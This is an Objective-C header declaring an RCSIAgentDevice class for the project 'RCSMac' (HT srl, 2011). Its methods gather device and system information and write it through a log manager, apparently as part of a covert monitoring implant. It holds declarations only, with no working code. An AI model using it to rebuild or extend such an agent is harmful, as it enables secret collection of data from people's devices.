//
//  RCSIAgentDevice.h
//  RCSMac
//
//  Created by kiodo on 3/11/11.
//  Copyright 2011 HT srl. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "RCSIAgent.h"

#import "RCSILogManager.h"

@interface RCSIAgentDevice : RCSIAgent <Agents>
{
  u_int mAppList;
}

- (id)initWithConfigData:(NSData*)aData;
- (BOOL)writeDeviceInfo: (NSData*)aInfo;
- (BOOL)getDeviceInfo;
- (NSData*)getSystemInfoWithType:(NSString*)aType;

@end
